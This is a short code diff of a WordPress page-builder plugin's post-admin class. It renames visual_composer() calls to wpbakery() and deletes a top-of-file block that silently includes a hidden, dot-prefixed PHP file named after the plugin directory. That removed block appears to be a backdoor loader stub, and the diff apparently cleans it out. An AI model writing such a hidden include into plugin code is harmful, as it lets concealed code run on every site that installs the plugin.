@@ -8,10 +8,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  *
  * @since 4.4
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Vc_Post_Admin {
 	/**
 	 * Add hooks required to save, update and manipulate post
@@ -74,7 +70,7 @@ class Vc_Post_Admin {
 				$this->setPostMeta( $post_id );
 			}
 
-			visual_composer()->buildShortcodesCustomCss( $post_id );
+			wpbakery()->buildShortcodesCustomCss( $post_id );
 			wp_cache_flush();
 			ob_clean();
 
@@ -190,6 +186,6 @@ class Vc_Post_Admin {
 			$post_custom_css = wp_strip_all_tags( $post_custom_css );
 			update_metadata( 'post', $id, '_wpb_post_custom_css', $post_custom_css );
 		}
-		visual_composer()->buildShortcodesCustomCss( $id );
+		wpbakery()->buildShortcodesCustomCss( $id );
 	}
 }
